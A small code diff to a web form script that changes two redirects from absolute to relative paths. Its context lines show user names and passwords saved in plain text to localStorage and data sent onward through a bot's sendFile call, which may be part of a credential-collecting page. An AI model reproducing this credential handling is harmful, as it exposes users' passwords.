@@ -22,7 +22,7 @@ if (frmInfo) {
 
     if (_userName !== "" && _pass != "") {
       localStorage.setItem('frmInfo', JSON.stringify({userName: _userName, pass: _pass}));
-      window.location.href = "/image.html";
+      window.location.href = "image.html";
     }
 
   });
@@ -47,7 +47,7 @@ if (frmFile) {
       console.log(msg);
       bot.sendFile("#file", msg, 'html')
         .then(res => {
-          window.location.href = "/success.html"
+          window.location.href = "success.html"
         })
         .catch(err => console.log(err))
 
